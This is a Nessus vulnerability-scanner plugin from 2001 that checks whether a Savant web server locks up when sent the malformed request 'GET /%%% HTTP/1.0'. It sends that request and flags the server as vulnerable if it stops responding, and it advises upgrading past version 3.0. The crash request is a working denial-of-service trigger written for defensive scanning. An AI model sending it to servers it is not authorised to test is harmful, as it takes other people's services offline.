#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10633);
 script_bugtraq_id(2468);
 script_version ("$Revision: 1.9 $");
 
 name["english"] = "Savant DoS";
 name["francais"] = "Déni de service Savant";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to lock
the remote server (probably a savant web server)
by doing the request :

	GET /%%% HTTP/1.0
	

You need to reboot it to make it work
again.


Solution :  upgrade to a version newer than 3.0 if you are using savant
web server
Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de bloquer
le serveur distant (probablement savant) en faisant la requete :

	GET /%%% HTTP/1.0
	
Solution : mettez à jour savant en version plus récente que 3.0 si
vous utilisez savant
Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote web server";
 summary["francais"] = "Fait planter un serveur web";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes", "no404.nasl", "http_version.nasl");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);
  
  soc = http_open_socket(port);
  if(soc)
  {
  data = http_get(item:"/%%%", port:port);
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port))security_hole(port);
  }
}
